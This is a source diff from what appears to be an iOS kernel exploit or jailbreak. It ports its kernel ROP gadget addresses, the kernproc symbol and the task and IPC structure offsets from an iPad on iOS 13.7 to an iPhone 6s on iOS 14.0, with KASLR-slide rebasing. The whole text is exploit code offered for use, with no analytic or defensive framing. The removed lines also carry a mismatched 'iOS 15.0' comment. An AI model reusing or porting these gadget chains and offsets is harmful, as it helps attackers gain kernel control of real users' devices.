@@ -22,19 +22,23 @@ uint64_t *gadgets = NULL;
 uint64_t *symbols = NULL;
 uint64_t kaslr_slide = 0;
 
-/* iOS 15.0 */
-uint64_t kgadgets_ipad_7_17h35[] = {
-    0xFFFFFFF006019AFC, // KGADGET_POPULATE
-    0xFFFFFFF006747A44, // KGADGET_PROLOGUE
-    0xFFFFFFF006628A94, // KGADGET_MOV_X10_X1__BR_X2
-    0xFFFFFFF00659DCAC, // KGADGET_MOV_X20_X3__BR_X2     
-    0xFFFFFFF006556E14, // KGADGET_MOV_X13_X1__BR_X2     
-    0xFFFFFFF006512534, // KGADGET_MOV_X11_X13__BR_X10   
-    0xFFFFFFF00654C500, // KGADGET_MOV_X7_X1__BR_X8
-    0xFFFFFFF00752BA84, // KGADGET_MOV_X0_X3__BR_X4
-    0xFFFFFFF006B3D428, // KGADGET_MOV_X5_X8__BR_X10
-    0xFFFFFFF0072EEECC, // KGADGET_MOV_X0_X20__BR_X11   
-    0xFFFFFFF0074DF6F0, // KGADGET_ADD_X0_X0_0X40__RET
+/* iOS 14.0 / iPhone 6s */
+uint64_t kgadgets_iphone_6s_18a373[] = {
+    0xFFFFFFF006805B44, // KGADGET_POPULATE
+    0xFFFFFFF0066DCA84, // KGADGET_PROLOGUE
+    0xFFFFFFF0064D26F8, // KGADGET_MOV_X12_X0__BR_X2
+    0xFFFFFFF0074DF178, // KGADGET_MOV_X0_X3__BR_X4
+    0xFFFFFFF007235050, // KGADGET_MOV_X0_X1__BR_X2
+    0xFFFFFFF006544BA4, // KGADGET_MOV_X15_X2__BR_X3
+    0xFFFFFFF006561048, // KGADGET_MOV_X20_X15__BR_X12
+    0xFFFFFFF00665B4EC, // KGADGET_MOV_X11_X1__BR_X12
+    0xFFFFFFF006599430, // KGADGET_MOV_X16_X1__BR_X2
+    0xFFFFFFF006562880, // KGADGET_MOV_X10_X12__BR_X8
+    0xFFFFFFF006589788, // KGADGET_MOV_X7_X16__BR_X10
+    0xFFFFFFF0065A0BB8, // KGADGET_MOV_X10_X0__BR_X2
+    0xFFFFFFF006AD1608, // KGADGET_MOV_X5_X8__BR_X10
+    0xFFFFFFF0072FF92C, // KGADGET_MOV_X0_X20__BR_X11
+    0xFFFFFFF0060412B8, // KGADGET_ADD_X0_X0_0X40__RET
 };
 
 uint64_t kgad(enum kgadget gad)
@@ -44,9 +48,9 @@ uint64_t kgad(enum kgadget gad)
     return gadgets[gad] + kaslr_slide;
 }
 
-uint64_t ksymbols_ipad_7_17h35[] = {
-    0xFFFFFFF0077702A0, // KSYMBOL_KERNPROC
-    0xFFFFFFF00612EB70, // KSYMBOL_RET_300
+uint64_t ksymbols_iphone_6s_18a373[] = {
+    0xFFFFFFF0070D01B8, // KSYMBOL_KERNPROC
+    0xFFFFFFF005FDB230, // KSYMBOL_RET_300
 };
 
 uint64_t ksym(enum ksymbol sym)
@@ -71,26 +75,26 @@ uint32_t off_mach_msg_header_t_msgh_remote_port = 0;
 
 
 void offsets_init(void) {
-    if (!(SYSTEM_VERSION_EQUAL_TO(@"13.7"))) {
-        printf("[-] Only supported offset for iOS 13.7\n");
+    if (!(SYSTEM_VERSION_EQUAL_TO(@"14.0"))) {
+        printf("[-] Only supported offset for iOS 14.0\n");
         exit(EXIT_FAILURE);
     }
     
-    if (SYSTEM_VERSION_EQUAL_TO(@"13.7")) {
-        printf("[i] offsets selected for iOS 13.7\n");
+    if (SYSTEM_VERSION_EQUAL_TO(@"14.0")) {
+        printf("[i] offsets selected for iOS 14.0\n");
 
         off_p_pid = 0x68; //v
         off_p_list_le_prev = 0x8;
         
         off_p_task = 0x10; //v
         
-        off_task_itk_space = 0x320; //v
+        off_task_itk_space = 0x330; //v
         off_ipc_space_is_table = 0x20;  //v
         off_ipc_space_is_task = 0x28; //v
 
         off_ipc_port_ip_kobject = 0x68; //v
         
-        gadgets = kgadgets_ipad_7_17h35;
-        symbols = ksymbols_ipad_7_17h35;
+        gadgets = kgadgets_iphone_6s_18a373;
+        symbols = ksymbols_iphone_6s_18a373;
     }
 }
